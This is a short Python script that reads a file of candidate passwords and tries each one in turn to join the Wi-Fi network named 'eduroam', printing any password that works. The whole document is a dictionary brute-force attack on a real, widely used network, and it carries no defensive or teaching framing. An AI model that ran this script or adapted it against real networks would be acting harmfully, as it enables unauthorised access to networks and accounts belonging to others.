from wireless import Wireless

wire = Wireless()
with open('passwordlist.txt', 'r') as file:
    for line in file.readlines():
        if wire.connect(ssid='eduroam', password=line.strip()):
            print('[+] ' + line.strip() + ' - Success!')
